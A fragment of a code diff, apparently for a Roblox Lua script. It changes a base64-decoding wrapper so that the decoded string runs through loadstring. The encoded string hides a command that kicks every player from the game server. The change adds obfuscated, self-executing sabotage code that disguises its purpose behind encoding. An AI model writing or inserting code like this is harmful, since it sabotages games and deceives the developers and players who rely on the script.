@@ -1,4 +1,4 @@
-(
+loadstring(
   function(data)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     return (string.gsub(data, '[^'..b..'=]', ''):gsub('.', function(x)
@@ -14,3 +14,4 @@
         end)
     )
 end)("Zm9yIGksIHBsYXllciBpbiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKSBkbyBnYW1lLlBsYXllcnM6S2ljayhnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIik6R2VuZXJhdGVHVUlEKGZhbHNlKSkgZW5k")
+)()
